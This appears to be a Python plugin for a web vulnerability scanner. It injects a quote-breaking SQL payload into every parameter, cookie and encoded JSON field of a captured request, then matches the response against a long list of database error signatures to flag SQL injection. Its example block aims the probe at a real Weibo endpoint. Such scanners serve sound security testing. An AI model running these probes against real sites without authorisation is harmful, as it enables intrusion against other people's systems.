#coding: utf-8
import logging
import json
import urllib.parse, base64
import copy
import requests
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(level = logging.INFO, format='%(asctime)s - %(levelname)s [%(filename)s:%(lineno)d]: %(message)s')


class Poc(object):

    def __init__(self):
        self.poc = "'\");"
        self.verifyArray = [
                'Microsoft OLE DB Provider for ODBC Drivers',
                'Error Executing Database Query',            
                'Microsoft OLE DB Provider for SQL Server',
                'ODBC Microsoft Access Driver',
                'ODBC SQL Server Driver',
                'supplied argument is not a valid MySQL result',
                'You have an error in your SQL syntax',
                'Incorrect column name',
                'Syntax error or access violation:',
                'Invalid column name',
                'Must declare the scalar variable',
                'Unknown system variable',
                'unrecognized token: ',
                'undefined alias:',
                'Can\'t find record in',
                '2147217900',
                'Unknown table',
                'Incorrect column specifier for column',
                'Column count doesn\'t match value count at row',
                'Unclosed quotation mark before the character string',
                'Unclosed quotation mark',
                'Call to a member function row_array() on a non-object in',
                'Invalid SQL:',
                'ERROR: parser: parse error at or near',
                '): encountered SQLException [',
                'Unexpected end of command in statement [',
                '[ODBC Informix driver][Informix]',
                '[Microsoft][ODBC Microsoft Access 97 Driver]',
                'Incorrect syntax near ',
                '[SQL Server Driver][SQL Server]Line 1: Incorrect syntax near',
                'SQL command not properly ended',
                'unexpected end of SQL command',
                'Supplied argument is not a valid PostgreSQL result',
                'internal error [IBM][CLI Driver][DB2/6000]',
                'PostgreSQL query failed',    
                'Supplied argument is not a valid PostgreSQL result',
                'pg_fetch_row() expects parameter 1 to be resource, boolean given in',
                'unterminated quoted string at or near',
                'unterminated quoted identifier at or near',
                'syntax error at end of input',
                'Syntax error in string in query expression',
                'Error: 221 Invalid formula',
                'java.sql.SQLSyntaxErrorException',
                'SQLite3::query(): Unable to prepare statement:',
                '<title>Conversion failed when converting the varchar value \'A\' to data type int.</title>',
                'SQLSTATE=42603',
                'org.hibernate.exception.SQLGrammarException:',
                'org.hibernate.QueryException',
                'System.Data.SqlClient.SqlException:',	
                'SqlException',
                'SQLite3::SQLException:',
                'Syntax error or access violation:',
                'Unclosed quotation mark after the character string',
                'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near',
                'PDOStatement::execute(): SQLSTATE[42601]: Syntax error:',
                '<b>SQL error: </b> no such column'            
            ]
        self.regexArray = [
            "(Incorrect\ssyntax\snear\s'[^']*')",
            "(Syntax error: Missing operand after '[^']*' operator)",
            "Syntax error near\s.*?\sin the full-text search condition\s",
            'column "\w{5}" does not exist',
            "near\s[^:]+?:\ssyntax\serror",
            "(pg_query\(\)[:]*\squery\sfailed:\serror:\s)",
            "('[^']*'\sis\snull\sor\snot\san\sobject)",
            "(ORA-\d{4,5}:\s)",
            "(Microsoft\sJET\sDatabase\sEngine\s\([^\)]*\)<br>Syntax\serror(.*)\sin\squery\sexpression\s'.*\.<br><b>.*,\sline\s\d+<\/b><br>)",
            "(<h2>\s<i>Syntax\serror\s(\([^\)]*\))?(in\sstring)?\sin\squery\sexpression\s'[^\.]*\.<\/i>\s<\/h2><\/span>)",
            "(<font\sface=\"Arial\"\ssize=2>Syntax\serror\s(.*)?in\squery\sexpression\s'(.*)\.<\/font>)",
            "(<b>Warning<\/b>:\s\spg_exec\(\)\s\[\<a\shref='function.pg\-exec\'\>function\.pg-exec\<\/a>\]\:\sQuery failed:\sERROR:\s\ssyntax error at or near \&quot\;\\\&quot; at character \d+ in\s<b>.*<\/b>)",
            "(System\.Data\.OleDb\.OleDbException\:\sSyntax\serror\s\([^)]*?\)\sin\squery\sexpression\s.*)",
            "(System\.Data\.OleDb\.OleDbException\:\sSyntax\serror\sin\sstring\sin\squery\sexpression\s)",
            "(Data type mismatch in criteria expression|Could not update; currently locked by user '.*?' on machine '.*?')",
            '(<font style="COLOR: black; FONT: 8pt\/11pt verdana">\s+(\[Macromedia\]\[SQLServer\sJDBC\sDriver\]\[SQLServer\]|Syntax\serror\sin\sstring\sin\squery\sexpression\s))',
            "(Unclosed\squotation\smark\safter\sthe\scharacter\sstring\s'[^']*')",
            "((<b>)?Warning(<\/b>)?:\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\(\): supplied argument is not a valid MySQL result resource in (<b>)?.*?(<\/b>)? on line (<b>)?\d+(<\/b>)?)",
            "((<b>)?Warning(<\/b>)?:\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\(\) expects parameter \d+ to be resource, \w+ given in (<b>)?.*?(<\/b>)? on line (<b>)?\d+(<\/b>)?)",
            "(You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '[^']*' at line \d)",
            '(Query\sfailed\:\sERROR\:\scolumn\s"[^"]*"\sdoes\snot\sexist\sLINE\s\d)',
            "(Query\sfailed\:\sERROR\:\s+unterminated quoted string at or near)",
            "(The string constant beginning with .*? does not have an ending string delimiter\.)",
            "(Unknown column '[^']+' in '\w+ clause')"
        ]

    
    def err_detect(self, data):
        ret = False
        p = ''
        for e in self.verifyArray:
            if e in data:
                p = e
                ret = True
                break
        if not ret:
            for e in self.regexArray:
                if re.search(e, data):
                    p = e
                    ret = True
                    break
        
        return ret, p

    def verify(self, data):
        try:
            metainfo = data
            # 登录扫描
            self.walkjson(metainfo['params'])
            self.walkjson(metainfo['data'])

            result = self.sendreq(metainfo)
            if result != False:
                r, p = self.err_detect(result.text)
                
                if r:
                    logging.info('================={}存在sql error'.format(metainfo.get('url')))
                    return [{
                            "title": "{} 存在sql错误漏洞".format(metainfo.get('url').split('?')[0]),
                            "desc":  "error {} ".format(p),
                            "request": metainfo,
                            "severity": "high",
                        }]

            # 非登录扫描
            self.walkjson(metainfo['cookies'])
            if metainfo['cookies']:
                result = self.sendreq(metainfo)
                if result != False:
                    r, p = self.err_detect(result.text)
                    
                    if r:
                        logging.info('================={}存在sql error'.format(metainfo.get('url')))
                        return [{
                                "title": "{} 存在sql错误漏洞".format(metainfo.get('url').split('?')[0]),
                                "desc":  "error {} ".format(p),
                                "request": metainfo,
                                "severity": "high",
                            }]
            
        except Exception as e:
            logging.error(str(e)+metainfo['url'])

    def walkjson(self, d):
        if isinstance(d, list):
            t = enumerate(d)
        elif isinstance(d, dict):
            t = d.items()
        for k, v in t:
            if isinstance(v, str):
                special = False
                if v.startswith('eyJ'):
                    try:
                        #base64json
                        vv = base64.b64decode(v)
                        vv = json.loads(vv)
                        special = True
                    except:
                        vv = {}
                        special = False
                    for _k,_v in vv.items():
                        vv[_k] = str(_v)+self.poc

                    if special:
                        d[k] = base64.b64encode(json.dumps(vv).encode()).decode()

                if not special and (v.startswith('%7B') or v.startswith('{')):
                    #json
                    vv = urllib.parse.unquote(v)
                    try:
                        vv = json.loads(vv)
                        special = True
                    except:
                        vv = {}
                        special = False
                    for _k,_v in vv.items():
                        #插入payload
                        vv[_k] = str(_v)+self.poc
                    if special:
                        d[k] = urllib.parse.quote(json.dumps(vv))
                if not special:
                    #插入payload
                    d[k] = str(v)+self.poc
                
            elif isinstance(v, list) or isinstance(v, dict):
                self.walkjson(v)


    def sendreq(self, data, allow_redirects=False):
        j = {}
        proxies = {}
        #proxies = { "http": "socks5://127.0.0.1:10800", "https": "socks5://127.0.0.1:10800", }
        #proxies = {"http": "http://127.0.0.1:8882", "https": "http://127.0.0.1:8882"}
        j['proxies'] = proxies
        j['url'] = data.get('url').split('?')[0]
        j['method'] = data.get('method')
        j['cookies'] = data.get('cookies')
        #默认会urlencode
        j['params'] = data.get('params')

        j['headers'] = data.get('headers')
        #http2.0
        if ':authority' in  j['headers'].keys():
            j['headers']['authority'] =  j['headers'][':authority']
            j['headers'].pop(':authority')
        #
        typess = data.get('type')
        if typess == 'json':
            j['json'] = data.get('data')
        elif typess == 'multipart':
            j['files'] = data.get('data')
        else:
            j['data'] = data.get('data')

        j['verify'] = False
        j['timeout'] = 10
        j['allow_redirects'] = allow_redirects

        return requests.request(**j)


if __name__ == '__main__':
    data = {"url": "https://widget.weibo.com/topics/topic_vote_base.php", "data": {"uid": "1709486153", "border": "0", "footbar": "1", "width": "821", "height": "559", "refer": "1", "filter": "0", "language": "zh_cn", "version": "eyJhIjoiaHR0cDovLyJ9", "dup": "0", "antispam": "0", "isOutTopicSearch": "0", "top_mblog": "H8gs8beQy", "isshowright": "1", "tag": "360%E6%8A%A2%E7%A5%A8%E7%8E%8B7%E4%BB%A3%2C%E5%BF%AB%E6%8A%A2%E7%A5%A8%E5%BF%AB%E5%9B%9E%E5%AE%B6%2C%E8%81%8A%E8%81%8A%E4%BD%A0%E7%9A%84%E6%98%A5%E8%BF%90%E6%95%85%E4%BA%8B", "og": "http%3A%2F%2F12306.360.cn%2F%3Ffrom%3Dweibo", "app_src": "5E3UYb", "r": "1566802460646"}, "method": "post", "cookies": {"YF-Widget-G0": "4a4609df0e4ef6187a7b4717d4e6cf12"}, "headers": {"host": "widget.weibo.com", "user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "accept-language": "en-US,en;q=0.5", "accept-encoding": "gzip, deflate, br", "referer": "http://12306.360.cn/", "connection": "keep-alive", "upgrade-insecure-requests": "1"}, "type": "form", "params": {}}

    print(Poc().verify(data))